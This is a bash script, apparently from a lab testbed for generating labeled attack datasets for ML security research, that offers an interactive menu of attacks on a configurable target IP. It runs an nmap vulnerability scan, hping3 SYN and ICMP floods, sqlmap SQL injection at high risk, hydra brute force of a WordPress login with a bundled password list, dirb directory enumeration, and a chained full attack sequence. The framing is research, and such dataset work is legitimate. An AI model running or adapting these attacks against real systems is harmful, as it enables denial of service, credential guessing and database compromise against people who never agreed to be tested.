#!/bin/bash

# =============================================================
# Security Testbed - Unified Attack Tools Script
# -------------------------------------------------------------
# Purpose:
#   Executes coordinated attack scenarios against a vulnerable target
#   for the purpose of generating labeled datasets for ML/AI security research.
#   Each attack is labeled with timing markers for correlation.
#
# Usage:
#   ./attack_tools.sh
#   (Interactive menu-driven attacks)
#
# Dependencies:
#   - nmap: Network scanning
#   - hping3: SYN/ICMP flood attacks
#   - sqlmap: SQL injection testing
#   - hydra: WordPress brute force
#   - dirb: Directory enumeration
#
# Output:
#   - Logs and timing markers in /logs
#   - Each attack produces a .log file for analysis
#
# Attack Types Table:
#   | Attack Type         | Description                  | Log File                  |
#   |---------------------|------------------------------|---------------------------|
#   | NMAP_SCAN           | Network reconnaissance       | nmap_scan.log             |
#   | SYN_FLOOD           | SYN flood DDoS attack        | syn_flood.log             |
#   | ICMP_FLOOD          | ICMP flood DDoS attack       | icmp_flood.log            |
#   | SQL_INJECTION       | SQL injection test           | sql_injection.log         |
#   | WP_BRUTEFORCE       | WordPress brute force        | wp_bruteforce.log         |
#   | DIR_SCAN            | Directory enumeration        | directory_scan.log        |
#
# Edge Cases:
#   - Connectivity is checked before attacks.
#   - Timeouts and error handling for long-running attacks.
#   - All attacks are labeled for dataset correlation.
# =============================================================

set -euo pipefail

TARGET_IP="${TARGET_IP:-100.64.0.20}"
LOG_DIR="/logs"
WORDLIST="/tmp/wordlist.txt"

# Create directories and wordlist
mkdir -p "$LOG_DIR"
cat > "$WORDLIST" << EOF
admin
password
123456
password123
admin123
root
test
guest
user
wordpress
letmein
welcome
qwerty
EOF

# Function: log
#   Logs attack events with timestamp for timeline analysis.
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [ATTACK] $1" | tee -a "$LOG_DIR/attack_timeline.log"
}

# Function: signal_attack
#   Signals attack start/end for monitor correlation and sends oversized ping.
signal_attack() {
    local attack_type="$1"
    local action="$2"  # START or END
    echo "ATTACK_MARKER|$attack_type|$action|$(date +'%Y-%m-%d %H:%M:%S.%3N')" | tee -a "$LOG_DIR/attack_markers.log"
    # Send signal packet for network correlation
    ping -c 1 -s 1400 "$TARGET_IP" >/dev/null 2>&1 || true
}

# Function: check_connectivity
#   Ensures target is reachable before running attacks.
check_connectivity() {
    log "Checking connectivity to $TARGET_IP..."
    while ! ping -c 1 -W 5 "$TARGET_IP" >/dev/null 2>&1; do
        log "Waiting for target connectivity..."
        sleep 2
    done
    log "Target $TARGET_IP is reachable"
}

# Function: network_scan
#   Performs network reconnaissance using nmap.
#   Output: $LOG_DIR/nmap_scan.log
network_scan() {
    signal_attack "NMAP_SCAN" "START"
    log "Starting network reconnaissance scan"
    nmap -sS -sV -O -A --script vuln "$TARGET_IP" | tee "$LOG_DIR/nmap_scan.log"
    signal_attack "NMAP_SCAN" "END"
}

# Function: ddos_syn_flood
#   Performs SYN flood DDoS attack using hping3 (30 seconds).
#   Output: $LOG_DIR/syn_flood.log
ddos_syn_flood() {
    signal_attack "SYN_FLOOD" "START"
    log "Starting SYN flood attack (30 seconds)"
    timeout 30 hping3 -S --flood -V -p 80 "$TARGET_IP" | tee "$LOG_DIR/syn_flood.log" || true
    signal_attack "SYN_FLOOD" "END"
}

# Function: ddos_icmp_flood
#   Performs ICMP flood DDoS attack using hping3 (30 seconds).
#   Output: $LOG_DIR/icmp_flood.log
ddos_icmp_flood() {
    signal_attack "ICMP_FLOOD" "START"
    log "Starting ICMP flood attack (30 seconds)"
    timeout 30 hping3 -1 --flood -V "$TARGET_IP" | tee "$LOG_DIR/icmp_flood.log" || true
    signal_attack "ICMP_FLOOD" "END"
}

# Function: web_sql_injection
#   Tests SQL injection vulnerability using sqlmap.
#   Output: $LOG_DIR/sql_injection.log
web_sql_injection() {
    signal_attack "SQL_INJECTION" "START"
    log "Testing SQL injection on vulnerable login"
    sqlmap -u "http://$TARGET_IP/vulnerable_login.php" --forms --batch --level=2 --risk=3 | tee "$LOG_DIR/sql_injection.log"
    signal_attack "SQL_INJECTION" "END"
}

# Function: wordpress_bruteforce
#   Performs brute force attack on WordPress login using hydra.
#   Output: $LOG_DIR/wp_bruteforce.log
wordpress_bruteforce() {
    signal_attack "WP_BRUTEFORCE" "START"
    log "Brute forcing WordPress login"
    hydra -l admin -P "$WORDLIST" "$TARGET_IP" http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -V | tee "$LOG_DIR/wp_bruteforce.log"
    signal_attack "WP_BRUTEFORCE" "END"
}

# Function: web_directory_scan
#   Performs directory enumeration using dirb.
#   Output: $LOG_DIR/directory_scan.log
web_directory_scan() {
    signal_attack "DIR_SCAN" "START"
    log "Directory enumeration scan"
    dirb "http://$TARGET_IP/" /usr/share/dirb/wordlists/common.txt | tee "$LOG_DIR/directory_scan.log"
    signal_attack "DIR_SCAN" "END"
}

# Function: run_attack_sequence
#   Runs a coordinated sequence of all attacks with cool-down periods.
run_attack_sequence() {
    log "=== Starting coordinated attack sequence ==="
    
    check_connectivity
    
    log "Phase 1: Reconnaissance"
    network_scan
    web_directory_scan
    
    log "Phase 2: Application attacks"
    web_sql_injection
    wordpress_bruteforce
    
    log "Phase 3: Network attacks"
    ddos_syn_flood
    sleep 10  # Cool down period
    ddos_icmp_flood
    
    log "=== Attack sequence completed ==="
}

# Interactive menu
# Function: show_menu
#   Displays interactive menu for attack selection.
show_menu() {
    echo ""
    echo "=== Security Testbed Attack Tools ==="
    echo "Target: $TARGET_IP"
    echo ""
    echo "1) Network Scan"
    echo "2) SQL Injection Test"
    echo "3) WordPress Brute Force"
    echo "4) Directory Enumeration"
    echo "5) SYN Flood Attack"
    echo "6) ICMP Flood Attack"
    echo "7) Run Full Attack Sequence"
    echo "8) Show Attack Logs"
    echo "9) Exit"
    echo ""
}

# Function: main
#   Main entry point. Checks connectivity and runs menu loop.
# Usage Example:
#   ./attack_tools.sh
#   (Follow interactive prompts to select and run attacks)
main() {
    check_connectivity
    
    while true; do
        show_menu
        read -p "Select option [1-9]: " choice
        
        case $choice in
            1) network_scan ;;
            2) web_sql_injection ;;
            3) wordpress_bruteforce ;;
            4) web_directory_scan ;;
            5) ddos_syn_flood ;;
            6) ddos_icmp_flood ;;
            7) run_attack_sequence ;;
            8) ls -la "$LOG_DIR/"*.log 2>/dev/null || echo "No logs found" ;;
            9) log "Exiting attack tools"; exit 0 ;;
            *) echo "Invalid option" ;;
        esac
    done
}

main "$@"